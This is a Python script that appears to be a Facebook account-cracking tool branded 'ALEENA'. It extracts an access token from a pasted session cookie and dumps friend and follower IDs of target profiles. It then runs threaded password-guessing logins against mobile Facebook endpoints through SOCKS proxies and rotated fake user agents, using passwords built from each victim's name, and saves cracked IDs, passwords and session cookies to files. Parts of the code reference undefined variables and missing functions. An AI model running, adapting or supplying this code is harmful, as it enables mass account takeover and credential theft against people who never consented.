#-----------------[ IMPORT-MODULE ]-------------------

import requests,bs4,json,os,sys,random,datetime,time,re

import urllib3,rich,base64

from rich.table import Table as me

from rich.console import Console as sol

from bs4 import BeautifulSoup as sop

from concurrent.futures import ThreadPoolExecutor as tred

from rich.console import Group as gp

from rich.panel import Panel as nel

from rich import print as cetak

from rich.markdown import Markdown as mark

from rich.columns import Columns as col

from rich import print as rprint

from rich import pretty

from rich.text import Text as tekz

pretty.install()

CON=sol()

#------------------[ USER-AGENT ]-------------------#

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]



	



	



for xd in range(10000):

	a='Mozilla/5.0 (Symbian/3; Series60/'

	b=random.randrange(1, 9)

	c=random.randrange(1, 9)

	d='Nokia'

	e=random.randrange(100, 9999)

	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'

	g=random.randrange(1, 9)

	h=random.randrange(1, 4)

	i=random.randrange(1, 4)

	j=random.randrange(1, 4)

	k='Mobile Safari/535.1'

	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

	ugen2.append(uaku)

	aa='Mozilla/5.0 (Linux; U; Android'

	b=random.choice(['6','7','8','9','10','11','12'])

	c=' en-us; GT-'

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.randrange(1, 999)

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

	h=random.randrange(73,100)

	i='0'

	j=random.randrange(4200,4900)

	k=random.randrange(40,150)

	l='Mobile Safari/537.36'

	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

	ugen.append(uaku2)

for x in range(10):

	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'

	b=random.randrange(100, 9999)

	c=random.randrange(100, 9999)

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	h=random.randrange(1, 9)

	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'

	j=random.randrange(1, 9)

	k=random.randrange(1, 9)

	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'

	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

def uaku():

	try:

		ua=open('bbnew.txt','r').read().splitlines()

		for ub in ua:

			ugen.append(ub)

	except:

		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text

		ua=open('.bbnew.txt','w')

		aa=re.findall('line">(.*?)<',str(a))

		for un in aa:

			ua.write(un+'\n')

		ua=open('.bbnew.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

cokbrut=[]

pwpluss,pwnya=[],[]

#------------[ WARNA-COLOR ]--------------#

P = '\x1b[1;97m'

M = '\x1b[1;91m'

H = '\x1b[1;92m'

K = '\x1b[1;93m'

B = '\x1b[1;94m'

U = '\x1b[1;95m' 

O = '\x1b[1;96m'

N = '\x1b[0m'    

Z = "\033[1;30m"

sir = '\033[41m\x1b[1;97m'

x = '\33[m' # DEFAULT

m = '\x1b[1;91m' #RED +

k = '\033[93m' # KUNING +

h = '\x1b[1;92m' # HIJAU +

hh = '\033[32m' # HIJAU -

u = '\033[95m' # UNGU

kk = '\033[33m' # KUNING -

b = '\33[1;96m' # BIRU -

p = '\x1b[0;34m' # BIRU +

asu = random.choice([m,k,h,u,b])

#--------------------[ CONVERTER-BULAN ]--------------#

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}

dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}

tgl = datetime.datetime.now().day

bln = dic[(str(datetime.datetime.now().month))]

thn = datetime.datetime.now().year

okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

#------------------[ MACHINE-SUPPORT ]---------------#

def alvino_xy(u):

        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)

def clear():

	os.system('clear')

def back():

	login()

	

#------------------[ LOGO-YASIN ]-----------------#

def banner():

	clear()

	sol()

	ban='''

      \x1b[1;97m

            © ALEENA Facebook account                             

  ___   _      _____ _____ _   _   ___  

 / _ \ | |    |  ___|  ___| \ | | / _ \ 

/ /_\ \| |    | |__ | |__ |  \| |/ /_\ \

|  _  || |    |  __||  __|| . ` ||  _  |

| | | || |____| |___| |___| |\  || | | |

\_| |_/\_____/\____/\____/\_| \_/\_| |_/

      \x1b[1;97m[<\>(:]\x1b[1;97mauthor: ALEENA KHAN (\x1b[1;92m\x1b[1;97m)

      \x1b[1;97m[<\>(:]\x1b[1;97mstatus: premium

      \x1b[1;97m[<\>(:]\x1b[1;97mWhatsapp :NOI HAI

      \033[41m\033[1;37m SMALL PROGRAMER \033[41m\033[1;37m\x1b[0m

      \033[47m\033[1;31m You Know \033[41m\033[1;37m who am i  \x1b[0m\n'''

	cetak(nel(ban, style='white'))

#--------------------[ BAGIAN-MASUK ]--------------#

def login():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

		tokenku.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})

			sy2 = json.loads(sy.text)['name']

			sy3 = json.loads(sy.text)['id']

			menu(sy2,sy3)

		except KeyError:

			login_lagi334()

		except requests.exceptions.ConnectionError:

			li = '# CHECK INTERNET CONNECTION, CHECK AND TRY AGAIN'

			lo = mark(li, style='red')

			sol().print(lo, style='purple')

			exit()

	except IOError:

		login_lagi334()

def login_lagi334():

	try:

		os.system('clear')

		banner()

		asu = random.choice([m,k,h,b,u])

		cookie=input(f'  [{h}•{u}] INPUT COOKIES :{asu} ')

		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 9; XIAOMI Mi Note 10 Pro Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.15.0","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 

		find_token = re.search("(EAAG\w+)", data.text)

		ken=open(".token.txt", "w").write(find_token.group(1))

		cok=open(".cok.txt", "w").write(cookie)

		print(f'  {u}[{h}•{u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ');time.sleep(1)

		exit()

	except Exception as e:

		os.system("rm -f .token.txt")

		os.system("rm -f .cok.txt")

		print(f'  %s[%sx%s]%s LOGIN ERROR....TRY AGAIN !!%s'%(x,k,x,m,x))

		exit()

#------------------[ BAGIAN-MENU ]----------------#

def menu(my_name,my_id):

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

	except IOError:

		print('[×] INVIALD COOKIE ')

		time.sleep(5)

		login_lagi334()

	os.system('clear')

	banner()

	ip = requests.get("https://api.ipify.org").text

	alvino_xy(f'{u}ID  : '+str(my_id))

	alvino_xy(f'{h}IP  : {ip}')

	print('')

	cetak('[bold green] 1. CRACK PUBLIC ID\n 0. EXIT [bold green]')

	_____cowok__pink_____ = input('\n CHOOSE : ')

	if _____cowok__pink_____ in ['1']:

		dump_massal()

	elif _____cowok__pink_____ in ['2']:

		dump_follower()

	elif _____cowok__pink_____ in ['3']:

		error()

	elif _____cowok__pink_____ in ['4']:

		crack_file()

	elif _____cowok__pink_____ in ['5']:

		result()

	elif _____cowok__pink_____ in ['0']:

		os.system('rm -rf .token.txt')

		os.system('rm -rf .cookie.txt')

		print('#DONE LOGOUT ')

		exit()

	else:

		print('# SELECT CORRECTLY ')

		back()

def error():

	print(f'{k}#TRY AGAIN {u}')

	time.sleep(4)

	back()

#-------------------[ CRACK-PUBLIK ]----------------#

def dump_massal():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

	except IOError:

		exit()

	try:

		jum = int(input('#ENTER THE NUMBERS OF IDZ YOU WANT TO CRACK  : '))

	except ValueError:

		print('{k}# SELECT CORRECTLY ')

		exit()

	if jum<1 or jum>100000000:

		print('#TRY AGAIN ')

		exit()

	ses=requests.Session()

	yz = 0

	for met in range(jum):

		yz+=1

		kl = input('#ID LINK '+str(yz)+' : ')

		uid.append(kl)

	for userr in uid:

		try:

			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()

			for mi in col['friends']['data']:

				try:

					iso = (mi['id']+'|'+mi['name'])

					if iso in id:pass

					else:id.append(iso)

				except:continue

		except (KeyError,IOError):

			pass

		except requests.exceptions.ConnectionError:

			print('{k}#TRY AGAIN ')

			os.system('clear')

	try:

		print('')

		print(f'{k}#TOTAL ID={b}'+str(len(id)))

		setting()

	except requests.exceptions.ConnectionError:

		print(f'{u}')

		print('#Sinyal Lo kek Kontol ')

		back()

	except (KeyError,IOError):

		print(f'#{k} IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LINK {u}')

		time.sleep(3)

		back()

#-------------------[ CRACK-PENGIKUT ]----------------#

def dump_pengikut():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

	except IOError:

		exit()

	print('#TYPE ME IF YOU WANT DUMP TOKEN ID FRIENDS ')

	pil = input('#ENTER ID LNK : ')

	try:

		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()

		for pi in koh2['subscribers']['data']:

			try:id.append(pi['id']+'|'+pi['name'])

			except:continue

		print(f'#Total Idz :{h} '+str(len(id)))

		setting()

	except requests.exceptions.ConnectionError:

		print('#CHECK INTERNET ')

		exit()

	except (KeyError,IOError):

		print('#ERORR ')

		exit()

#-------------[ PENGATURAN-IDZ ]---------------#

def setting():

	cetak('\t[bold cyan]CLONING MENU')

	print('') 

	cetak('[bold yellow]1. CLONE JUST OLD IDZ \n2. CLONE JUST NEW IDZ\n3. CLONE MIX IDZ (NEW/OLD)BEST [bold yellow]')

	print('')

	hu = input('CHOOSE : ')

	if hu in ['1','01']:

		for tua in sorted(id):

			id2.append(tua)

	elif hu in ['2','02']:

		muda=[]

		for bacot in sorted(id):

			muda.append(bacot)

		bcm=len(muda)

		bcmi=(bcm-1)

		for xmud in range(bcm):

			id2.append(muda[bcmi])

			bcmi -=1

	elif hu in ['3','03']:

		for bacot in id:

			xx = random.randint(0,len(id2))

			id2.insert(xx,bacot)

	else:

		print('#TRY AGAIN')

		exit()

	cetak('\t[bold green]LOGIN METHOD')

	print('') 

	cetak('[bold white]1. MOBILE\n2. MBASIC(Best)\n3. TOUCH\n4. MTOUCH [bold purple]')

	print('')

	hc = input('>> CHOOSE : ')

	if hc in ['1','01']:

		method.append('mobile')

#	elif hc in ['2','02']:

#		method.append('free')

#	elif hc in ['3','03']:

#		method.append('touch')

	elif hc in ['4','04']:

		method.append('mbasic')

	else:

		method.append('mobile')

		os.system('clear')

	print('')

	pwplus=input('TRY DEAFULT PASSWORD (d) ( m/d ) ')

	if pwplus in ['y','Y']:

		pwpluss.append('ya')

		cetak(nel('[[purple]•[yellow]] ADD PASWORD MXM 6 WORDS\n[[purple]•[yellow]] EXIMPLE :[green] 123,786,1234[purple] '))

		pwku=input('#Add PASSWORDS : ')

		pwkuh=pwku.split(',')

		for xpw in pwkuh:

			pwnya.append(xpw)

	else:

		pwpluss.append('no')

	passwrd()

	exit() 

#-------------------[ BAGIAN-WORDLIST ]------------#

def passwrd():

	cetak('[bold cyan]               PROCESS HAS BEEN STARTED [bold cyan]')

	print(f'                   ')

	print('')

	print(f'SSG {h}OK{u} SAVED IN : {h}OK/%s {b}'%(okc))

	print(f'SSG {k}CP{h} SAVED IN : {k}CP/%s {b}'%(cpc))

	print(f'TURN ON/OFF FLIGHT MODE IF NO RESULTS SEEN\n')

	with tred(max_workers=30) as pool:

		for yuzong in id2:

			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()

			frs = nmf.split(' ')[0]

			pwv = []

			if len(nmf)<6:

				if len(frs)<3:

					pass

				else:

					pwv.append(frs+'123')

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')

					pwv.append(frs+'786')

					pwv.append(frs+'1122')

					pwv.append(frs+'112233')

			else:

				if len(frs)<3:

					pwv.append(nmf)

				else:

					pwv.append(nmf)

					pwv.append(frs+'123')

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')

					pwv.append(frs+'786')

					pwv.append(frs+'1122')

					pwv.append(frs+'1122333')

			if 'ya' in pwpluss:

				for xpwd in pwnya:

					pwv.append(xpwd)

			else:pass

			if 'mobile' in method:

				pool.submit(crack,idf,pwv)

			elif 'free' in method:

				pool.submit(crackfree,idf,pwv)

			elif 'touch' in method:

				pool.submit(cracktouch,idf,pwv)

			elif 'mbasic' in method:

				pool.submit(crackmbasic,idf,pwv)

			else:

				pool.submit(crackmbasic,idf,pwv)

	print('')

	cetak('\t[purple]#[green] CRACK COMPLETE[purple] <<[yellow] ')

	print(f'[{h}•{u}]{h} OK : {h}%s '%(ok))

	print(f'{k}[{k}•{h}]{k} CP : {k}%s{u} '%(cp))

	print('')

	print('{k} PRESS ENTER TO BACK')

	woi = input(' : ')

	if woi in ['y','Y']:

		back()

	else:

		print(f'\t{x}{k} PRESS ENTER TO BACK {u} ')

		time.sleep(2)

		exit()

#--------------------[ METODE-B-API ]-----------------#

def crack(idf,pwv):

	global loop,ok,cp

	bo = random.choice([m,k,h,b,u,x])

	sys.stdout.write(f"\r{b}[SSG]{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),

	sys.stdout.flush()

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	for pw in pwv:

		try:

			nip=random.choice(prox)

			proxs= {'http': 'socks4://'+nip}

			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})

			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}

			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])

			koki+=' m_pixel_ratio=2.625; wd=412x756'

			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}

			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)

			if "checkpoint" in po.cookies.get_dict().keys():

				cetak('  [red]     ALEENA-CP🔪 [red]')

				print(f'\r{K}>> {idf}  {pw}                                            {N}')     

				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)

				cp+=1

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				ok+=1

				coki=po.cookies.get_dict()

				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

				cetak('[green]      ALEENA-OK🔥 [green]')

				print(f'\r{H}>> {idf}  {pw}                                               {kuki}\n{ua}{N}')

				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')

				cek_apk(session,coki)

				break

				

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1

#------------------[ METHODE-MBASIC-2 ]-------------------#

def crackfree(idf,pwv):

	global loop,ok,cp

	sys.stdout.write(f"\r# {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),

	sys.stdout.flush()

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	for pw in pwv:

		try:

			ses.headers.update({"Host":"p.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})

			p = ses.get('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}

			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])

			koki+=' m_pixel_ratio=2.625; wd=412x756'

			heade={"Host":"p.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)

			if "checkpoint" in po.cookies.get_dict().keys():

				cetak('  [red]     ALEENACP [red]')

				print(f'\r{K}>>  {idf}                                            {pw}{N}')     

				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)

				cp+=1

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				ok+=1

				coki=po.cookies.get_dict()

				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

				cetak('[green]      ALEENA-OK🔥 [green]')

				print(f'\r{H}>>  {idf} {pw}                                               {kuki}')

				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')

				cek_apk(session,coki)

				break

				

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1

#---------------------[ METHODE-TOUCH-3 ]---------------------#

def cracktouch(idf,pwv):

	global loop,ok,cp

	bi = random.choice([u,k,kk,b,h,hh])

	pers = loop*100/len(id2)

	fff = '%'

	nip=random.choice(prox)

	proxs= {'http': 'socks5://'+nip}

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	sys.stdout.write('\r%s[S.S.G]%s/%s / OK:%s / CP:%s / %s%s%s !'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()

	for pw in pwv:

		try:

			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})

			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}

			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})

			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)

			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])

			koki+=' m_pixel_ratio=2.625; wd=412x756'

			

			if "checkpoint" in po.cookies.get_dict().keys():

				if 'ya' in oprek:

					akun.append(idf+'|'+pw)

					ceker(idf,pw)

				elif 'ya' in princp:

					print('\n')

					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'

					statuscp1 = nel(statuscp, style='red')

					cetak(nel(statuscp1, title='XS CP'))

					open('/sdcard/SSG-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')

					akun.append(idf+'|'+pw)

					cp+=1

				else:continue

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}

				if 'no' in taplikasi:

					coki=po.cookies.get_dict()

					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					open('/sdcard/SXS-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')

					print('\n')

					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'

					statusok1 = nel(statusok, style='green')

					cetak(nel(statusok1, title='ALEENA-OK🔥'))

					ok+=1

					break

				elif 'ya' in taplikasi:

					coki=po.cookies.get_dict()

					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					open('/sdcard/SXS-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')

					user=idf

					infoakun = ""

					session = requests.Session()

					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text

					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text

					infoakun += (f"\n[bold cyan][•] ACTIVE APPLICATIONS :[/bold cyan] \n")

					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))

					nok=1

					for muncul in apkaktif:

						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")

						nok+=1

					hit=0

					infoakun += (f"\n[bold yellow][•] EXPIRED APPLICATIONS :[/bold yellow]\n")

					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))

					hit=0

					for muncul in apkexp:

						hit+=1

						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")

					print('\n')

					statusok = f'[bold green][•] ID       : {idf}\n [•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'

					statusok1 = nel(statusok, style='green')

					cetak(statusok1, title='[bold green]SXS OK[/bold green]')

					ok+=1

					break

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1

#----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#

def crackmbasic(idf,pwv):

	global loop,ok,cp

	bi = random.choice([u,k,kk,b,h,hh])

	pers = loop*100/len(id2)

	fff = '%'

	nip=random.choice(prox)

	proxs= {'http': 'socks5://'+nip}

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	sys.stdout.write('\r%s [S.S.G] %s/%s / OK:%s / CP:%s / %s%s%s !'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()

	for pw in pwv:

		try:

			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})

			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}

			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])

			koki+=' m_pixel_ratio=2.625; wd=412x756'

